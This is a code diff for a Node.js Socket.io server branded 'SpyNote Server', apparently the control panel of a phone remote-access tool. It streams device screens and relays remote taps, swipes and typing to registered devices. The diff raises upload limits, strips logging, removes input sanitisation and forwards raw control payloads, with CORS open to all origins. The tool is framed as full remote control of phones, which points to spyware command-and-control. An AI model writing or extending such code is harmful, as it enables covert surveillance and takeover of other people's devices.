@@ -8,15 +8,15 @@ const app = express();
 const server = http.createServer(app);
 const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
-    pingTimeout: 10000,
+    pingTimeout: 15000,
     pingInterval: 5000,
-    maxHttpBufferSize: 100 * 1024 * 1024
+    maxHttpBufferSize: 200 * 1024 * 1024
 });
 
 app.use(compression());
 app.use(express.static('public'));
-app.use(express.json({ limit: '100mb' }));
-app.use(express.urlencoded({ limit: '100mb', extended: true }));
+app.use(express.json({ limit: '200mb' }));
+app.use(express.urlencoded({ limit: '200mb', extended: true }));
 
 const devices = new Map();
 const deviceSockets = new Map();
@@ -49,16 +49,14 @@ io.on('connection', (socket) => {
             deviceSockets.set(deviceId, socket.id);
             socket.join(deviceId);
             io.emit('devices-update', Array.from(devices.entries()));
-            console.log("📱 Device registered:", deviceId, "Socket:", socket.id);
+            console.log("📱 Device registered:", deviceId);
         }
     });
 
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
-        console.log('📺 Frame from:', deviceId);
-        
         if (devices.has(deviceId)) {
-            socket.broadcast.emit('screen-update', {
+            socket.broadcast.to(deviceId).emit('screen-update', {
                 deviceId,
                 data: data.data,
                 width: data.width,
@@ -68,43 +66,19 @@ io.on('connection', (socket) => {
         }
     });
 
-    // 🔥 FIXED CONTROL HANDLER
+    // 🔥 PERFECT CONTROL HANDLER (Typing Added)
     socket.on('control', (data) => {
-        console.log('🎮 RAW CONTROL RECEIVED:', JSON.stringify(data, null, 2));
+        console.log('🎮 CONTROL:', data.action, 'Device:', data.deviceId);
         
-        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
-        console.log('🎮 PARSED -> Device:', deviceId, 'Action:', action);
-        console.log('🎮 COORDS -> x:', x, 'y:', y, 'startX:', startX, 'startY:', startY, 'endX:', endX, 'endY:', endY);
-        
-        if (!devices.has(deviceId)) {
-            console.log('❌ Device not found:', deviceId);
-            return;
-        }
+        const { deviceId, action } = data;
+        if (!devices.has(deviceId)) return;
 
         const targetSocketId = deviceSockets.get(deviceId);
-        if (!targetSocketId) {
-            console.log('⚠️ Device socket not found:', deviceId);
-            return;
-        }
+        if (!targetSocketId) return;
 
-        // 🔥 CLEAN DATA FOR DEVICE
-        const cleanData = {
-            action: action,
-            x: Number(x) || 0,
-            y: Number(y) || 0,
-            startX: Number(startX) || Number(x) || 0,
-            startY: Number(startY) || Number(y) || 0,
-            endX: Number(endX) || 0,
-            endY: Number(endY) || 0
-        };
-
-        console.log('✅ SENDING TO DEVICE:', JSON.stringify(cleanData, null, 2));
-
-        // Send to specific socket AND room
-        io.to(targetSocketId).emit('control', cleanData);
-        io.to(deviceId).emit('control', cleanData);
-        
-        console.log('✅ Control sent to:', deviceId, 'Socket:', targetSocketId);
+        // 🔥 Send to specific device socket + room
+        io.to(deviceId).emit('control', data);
+        io.to(targetSocketId).emit('control', data);
     });
 
     socket.on('disconnect', () => {
@@ -114,7 +88,6 @@ io.on('connection', (socket) => {
                 devices.set(deviceId, { ...info, connected: false });
                 deviceSockets.delete(deviceId);
                 io.emit('devices-update', Array.from(devices.entries()));
-                console.log('📱 Device disconnected:', deviceId);
                 break;
             }
         }
@@ -124,5 +97,5 @@ io.on('connection', (socket) => {
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`🚀 SpyNote Server: http://localhost:${PORT}`);
-    console.log(`📱 Multi-device + FULL CONTROL ready!`);
+    console.log(`📱 Multi-device + FULL CONTROL + TYPING ready!`);
 });
